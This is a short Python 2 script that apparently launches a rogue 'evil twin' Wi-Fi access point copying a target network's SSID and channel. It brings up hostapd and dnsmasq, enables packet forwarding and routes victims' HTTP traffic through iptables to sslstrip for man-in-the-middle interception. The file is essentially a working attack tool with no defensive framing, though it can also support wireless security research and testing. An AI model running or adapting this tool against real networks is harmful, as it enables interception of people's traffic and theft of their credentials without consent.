import utils
import time
from argparse import ArgumentParser


####################################################################################
def set_configs():
    parser = ArgumentParser()

    parser.add_argument('-l',
                dest='upstream',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface as access point.')

    parser.add_argument('-i',
                dest='phys',
                required=True,
                type=str,
                metavar='<interface>',
                help='Use this interface to connect to network gateway.')

    parser.add_argument('-s',
                dest='ssid',
                required=True,
                type=str,
                metavar='<ssid>',
                help='The ssid of the target ap.')

    parser.add_argument('-c',
                dest='channel',
                required=True,
                type=int,
                metavar='<channel>',
                help='The channel of the target ap.')

    args = parser.parse_args()
    
    return {

        'upstream' : args.upstream,
        'phys' : args.phys,
        'ssid' : args.ssid,
        'channel' : args.channel,
    }


###########################################################################################
def display_configs(configs):
    print
    print '[+] Access Point interface:', configs['upstream']
    print '[+] Network interface:', configs['phys']
    print '[+] Target AP Name:', configs['ssid']
    print '[+] Target AP Channel:', configs['channel']
    print

def kill_daemons():
    print '[*] Killing existing dnsmasq and hostapd processes.'
    print 
    utils.bash_command('killall dnsmasq')
    utils.bash_command('killall hostapd')
    print
    print '[*] Continuing...'


############################################################################################
def main():
    # get configs from command line and display them
    configs = set_configs()
    display_configs(configs)

    # kill existing daemon processes
    kill_daemons()

    # obtain interfaces to iptables, hostapd, and dnsmasq
    hostapd = utils.HostAPD.get_instance()
    iptables = utils.IPTables.get_instance()
    dnsmasq = utils.DNSMasq.get_instance()

    # bring up ap interface
    utils.bash_command('ifconfig %s down' % configs['upstream'])
    utils.bash_command('ifconfig %s 10.0.0.1/24 up' % configs['upstream'])

    # configure dnsmasq
    print '[*] Configuring dnsmasq'
    dnsmasq.configure(configs['upstream'],
                    '10.0.0.10,10.0.0.250,12h',
                    dhcp_options=[ '3,10.0.0.1', '6,10.0.0.1' ])

    # enable packet forwarding
    print '[*] Enabling packet forwarding.'
    utils.enable_packet_forwarding()

    print '[*] Configuring iptables to route http traffic to sslstrip'
    iptables.route_to_sslstrip(configs['phys'], configs['upstream'])

    try:

        # launch access point
        print '[*] Starting dnsmasq.'
        dnsmasq.start()
        print '[*] Starting hostapd.'
        hostapd.start()

    except KeyboardInterrupt:

        print '\n\n[*] Exiting on user command.'

    # restore everything
    print '[*] Stopping dnsmasq.'
    dnsmasq.stop()
    print '[*] Stopping hostapd.'
    hostapd.stop()


    print '[*] Restoring iptables.'
    iptables.reset()

    print '[*] Disabling packet forwarding.'
    utils.disable_packet_forwarding()

if __name__ == '__main__':
    main()
